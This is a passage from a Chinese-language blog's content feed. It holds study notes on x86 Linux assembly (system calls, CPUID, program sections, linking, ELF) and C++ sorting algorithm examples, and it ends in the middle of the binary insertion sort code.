alt="image-20201216213003490" style="zoom:50%;"><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216213030045.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216213030045.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216213030045"></p><p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216213003490.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216213003490.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216213003490" style="zoom:50%;"><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216213030045.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216213030045.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216213030045"></p><h1 id="17-系统调用"><a href="#17-系统调用" class="headerlink" title="17.系统调用"></a>17.系统调用</h1><ul><li><p>x86-Linux下的系统调用时通过中断指令(int 0x80)来实现的</p></li><li><p>在执行int $0x80指令时</p><p>寄存器eax中存放的是系统调用的功能号，而传给系统调用的。</p><p>参数则必须按顺序放到寄存器ebx，ecx，edx，esi，edi中</p><p>当系统调用完成之后，返回值可以在寄存器中eax中获得</p></li><li><p>当一个系统调用所需的参数个数大于5时</p><p>需将系统调用功能号保存在<code>寄存器eax</code>中，全部参数一次连续放在一块连续的内存区域里，同时<code>寄存器ebx</code>中保存指向该内存区域的指针</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216214654125.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216214654125.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216214654125" style="zoom:33%;"></li></ul><p><strong>先把参数先放入寄存器，再系统调用</strong></p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216215104222.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216215104222.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216215104222" style="zoom:50%;"><p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216215132300.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216215132300.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216215132300"></p><p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216215151664.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201216215151664.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201216215151664"></p><h1 id="18-汇编调用lib-c库函数"><a href="#18-汇编调用lib-c库函数" class="headerlink" title="18.汇编调用lib_c库函数"></a>18.汇编调用lib_c库函数</h1><p><strong>CPUID指令</strong>是一条汇编指令，它是请求处理器的<strong>特定信息</strong>并把信息返回到<strong>特定寄存器的</strong>低级指令。</p><p>CPUID指令使用单一寄存器作为输入，EAX寄存器用于决定CPUID指令生成什么信息。</p><p>根据EAX寄存器的值，CPUID指令在EBX，ECX和EDX寄存器中生成关于处理器的不同信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl $0,%eax</span><br><span class="line">cpuid</span><br></pre></td></tr></table></figure><p>当0倍放入到%eax寄存器并且执行CPUID指令时，处理器把厂商ID字符串返回到EBX，EDX和ECX寄存器中</p><p><strong>程序结构：</strong></p><ul><li>主要分成三个段：</li></ul><p>.data 数据段 声明带有初始值的元素</p><p>.bss 数据段 声明无需初始化的元素</p><p>.text 正文段 程序指令 每个汇编程序都必须包含此段</p><ul><li><p>程序入口地址</p><p>汇编器使用_start符号表示默认的起始点，此外如果想要汇编内部的符号能够被外部模块访问，需要赋予.globl属性，如：</p><p>.globl    _start</p></li></ul><h1 id="19-程序结构"><a href="#19-程序结构" class="headerlink" title="19.程序结构"></a>19.程序结构</h1><h3 id="1-数据段-data"><a href="#1-数据段-data" class="headerlink" title="1.数据段 .data"></a>1.数据段 .data</h3><p><strong>只读数据段 .rodata</strong>：声明一个数据元素时，需要使用Symbol和类型说明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">output:</span><br><span class="line">.ascii &quot;hello world.&quot;</span><br><span class="line">pi:</span><br><span class="line">.float 2.14</span><br><span class="line">#声明可以在一行中定义多个值：</span><br><span class="line">ages:</span><br><span class="line">.int 20,10,30,40</span><br></pre></td></tr></table></figure><h3 id="2-bss段"><a href="#2-bss段" class="headerlink" title="2.bss段"></a>2.bss段</h3><p><strong>bss段：</strong>和data段不同，无需声明特定的数据类型，只需声明为所需目的保留的原始内存部分即可</p><p><code>.comm声明为未初始化的全局内存区域</code></p><p><code>.lcomm声明为未初始化的本地内存区域(局部变量)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.section .bss</span><br><span class="line">.lcomm buffer,1000</span><br><span class="line">#该语句把1000字节的内存地址赋予buffer，外部模块不能访问他们</span><br></pre></td></tr></table></figure><h1 id="20-程序链接-linking"><a href="#20-程序链接-linking" class="headerlink" title="20.程序链接 linking"></a>20.程序链接 linking</h1><h3 id="1-静态链接-Static-Linking"><a href="#1-静态链接-Static-Linking" class="headerlink" title="1.静态链接(Static Linking)"></a>1.静态链接(Static Linking)</h3><h3 id="2-链接步骤："><a href="#2-链接步骤：" class="headerlink" title="2.链接步骤："></a>2.链接步骤：</h3><h5 id="1-符号解析"><a href="#1-符号解析" class="headerlink" title="1.符号解析"></a><strong>1.符号解析</strong></h5><ul><li><p>程序定义以及引用了一系列符号(symbols，包含变量与函数)</p><p>void swap(){}</p><p>swap()</p></li><li><p>编译器将符号定义存储在符号表(symbol table)中</p></li><li><p>链接器将每一个符号引用于符号定义联系起来</p></li><li><p>链接符号：</p><p><strong>全局符号</strong>：某一个模块定义、且可以被其他模块引用的变量或者函数符号(全局非静态函数或者变量)</p><p><strong>外部符号</strong>：某个模块引用的由其他模块定义的全局符号(extern)</p><p><strong>局部符号</strong>：由某个模块定义且仅有该模块引用的符号(静态的函数或者变量)</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201220133442852.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201220133442852.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201220133442852" style="zoom:50%;"></li></ul><h5 id="2-重定位"><a href="#2-重定位" class="headerlink" title="2.重定位"></a><strong>2.重定位</strong></h5><ul><li>将多个文件的数据、代码段集成为单一的数据段和代码段</li><li>将.o文件中的符号解析为绝对地址</li><li>然后将所有的符号引用更新为这些新的地址</li></ul><h3 id="3-三种不同的对象文件"><a href="#3-三种不同的对象文件" class="headerlink" title="3.三种不同的对象文件"></a>3.三种不同的对象文件</h3><ul><li><p><strong>重定向对象文件(.o文件)</strong></p><p>含有一定格式的代码与数据内容，可以与其他重定向对象文件一起集成为执行文件(一个.o文件由唯一的一个源文件生成)</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201220133819969.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201220133819969.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201220133819969" style="zoom: 67%;"></li><li><p><strong>执行文件(a.out文件)</strong></p><p>含有一定格式的代码与数据内容，可以直接被装载入内存并执行</p></li><li><p><strong>共享对象文件(.so文件)</strong></p><p>特殊类型的重定向对象文件，可以被装载入内存后进行动态链接；<strong>链接可以在装载时或者运行时</strong>完成</p><p>Windows系统下被称为DDL文件</p></li></ul><h3 id="4-ELF文件格式"><a href="#4-ELF文件格式" class="headerlink" title="4.ELF文件格式"></a>4.ELF文件格式</h3><p>LINUX下的可执行文件格式为ELF；ELF文件的全称是Executable and Linkable Format，意为可执行的、可连接的格式。</p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201220131944786.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201220131944786.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201220131944786" style="zoom:67%;"><p><img src="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201220132304639.png" class="lazyload" data-srcset="/2020/12/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/image-20201220132304639.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201220132304639"></p>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-排序、查找算法</title>
      <link href="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/"/>
      <url>/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一、排序算法"><a href="#一、排序算法" class="headerlink" title="一、排序算法"></a>一、排序算法</h1><ul><li>冒泡排序、双向冒泡排序</li><li>选择排序</li><li>插入排序、二分法插入排序、希尔排序</li><li>快速排序(递归与非递归)</li><li>归并排序(递归与非递归)</li><li>堆排序</li></ul><h3 id="1-冒泡排序、双向冒泡排序"><a href="#1-冒泡排序、双向冒泡排序" class="headerlink" title="1.冒泡排序、双向冒泡排序"></a>1.冒泡排序、双向冒泡排序</h3><p><img src="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-33a947c71ad62b254cab62e5364d2813_b.webp" class="lazyload" data-srcset="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-33a947c71ad62b254cab62e5364d2813_b.webp" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>冒泡排序通过两两不断比较，如果后者比前者大，那就继续比较，反之，交换两者的数值，直到最后一个元素，最后的到的数值应该就是未排序序列中的最大值。双向冒泡排序(按照其中一种情况)将序列的最大值往右移、序列的最小值往左移。</p><p><strong>普通冒泡排序</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="comment">//把最大的数冒泡到最后面</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;length-i<span class="number">-1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arry[j]&lt;arry[j+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="built_in">Swap</span>(arry[j],arry[j+<span class="number">1</span>]);    </span><br><span class="line">                flag=<span class="number">1</span>;            </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此算法的改进是加一个flag，当flag为0的时候代表的着遍历的过程已经满足排序的要求，可以直接退出。</p><p>而对于双向冒泡排序，按照其中一种情况，大的往后冒，小的往前冒，在第一层循环中加两个循环</p><p><strong>双向冒泡排序</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_BubbleSort</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> low=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> high=length<span class="number">-1</span>;<span class="comment">//不管是双向还是单向 判断往右冒的时候如果是i+1 为了不越界 右界应该都为length-1</span></span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (low&lt;high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//正向冒泡 找出最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=low;i&lt;high;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arry[i]&gt;arry[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="built_in">Swap</span>(arry[i],arry[i+<span class="number">1</span>]);</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        high--;</span><br><span class="line">        <span class="comment">//反向冒泡 找出最小值 已经存在一个最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=high;i&gt;low;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arry[i]&lt;arry[i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="built_in">Swap</span>(arry[i],arry[i<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        low++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2.选择排序"></a>2.选择排序</h2><p><img src="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-1c7e20f306ddc02eb4e3a50fa7817ff4_b.webp" class="lazyload" data-srcset="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-1c7e20f306ddc02eb4e3a50fa7817ff4_b.webp" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>选择排序外层循环一开始假设i下标是<strong>最大值</strong>或者最小值放入k中，通过内层循环去遍历整个序列，如果序列中有比它大的值，将该值的下标放入k中。循环完成之后看下标是否有发生变化，有发生变化，交换i与k的值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SelectSort</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="comment">//选择最小的数然后放到前面</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;length;j++)</span><br><span class="line">            <span class="keyword">if</span>(arry[k]&gt;arry[j]) k=j;</span><br><span class="line">        <span class="keyword">if</span>(k!=i)&#123;</span><br><span class="line">            <span class="keyword">int</span> temp=arry[k];</span><br><span class="line">            arry[k]=arry[i];</span><br><span class="line">            arry[i]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-插入排序、二分法插入排序、希尔排序"><a href="#3-插入排序、二分法插入排序、希尔排序" class="headerlink" title="3.插入排序、二分法插入排序、希尔排序"></a>3.插入排序、二分法插入排序、希尔排序</h2><h4 id="3-1、简单插入排序"><a href="#3-1、简单插入排序" class="headerlink" title="3.1、简单插入排序"></a>3.1、简单插入排序</h4><p><img src="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-91b76e8e4dab9b0cad9a017d7dd431e2_b.webp" class="lazyload" data-srcset="/2020/12/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%8E%92%E5%BA%8F%E3%80%81%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/v2-91b76e8e4dab9b0cad9a017d7dd431e2_b.webp" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>插入排序是先遍历一遍序列，然后遍历到<code>i</code>的值与<strong>前面已经排好的序列</strong>的值进行比对，找到插入的位置<code>k</code>，<code>k</code>-<code>i-1</code>的值全部往后移动一个单位，然后<code>i</code>的值插入<code>k</code>的位置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;length;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp=arry[i];</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arry[j]&lt;tmp)&#123;</span><br><span class="line">                arry[j+<span class="number">1</span>]=arry[j];</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        arry[j+<span class="number">1</span>]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>tmp</code>来保存外层循环遍历的值，<code>arry[j+1]=arry[j]</code>该操作将找到位置的值全部往后移动一个单位。</p><h3 id="3-2、二分法插入排序"><a href="#3-2、二分法插入排序" class="headerlink" title="3.2、二分法插入排序"></a>3.2、二分法插入排序</h3><p>二分法插入排序的核心思想跟简单插入排序一样，唯一不同就是在查找的过程使用二分法，可以使得查找的时间明显减少</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BinaryInsertSort</span><span class="params">(<span class="keyword">int</span> arry[],<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="comment">//主要核心在与前面有序序列的二分法的查找</span></span><br><span class="line">    <span class="comment">//如果没查到该元素 right的位置在middle-1 而left在middle </span></span><br><span class="line">    <span class="comment">//此时的tmp小于等于left所在的值  平移i到left的所有元素 left原来的位置直接给tmp</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;length;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">int</span> tmp=arry[i];</span><br><span class="line">        <span class="keyword">int</span> middle,left=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right=i<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            middle=(left+right)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(arry[middle]&gt;tmp)</span><br><span class="line">                right=middle<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                left=middle+<span class="number">1</span>;</span><br><span class="line">            &#125;      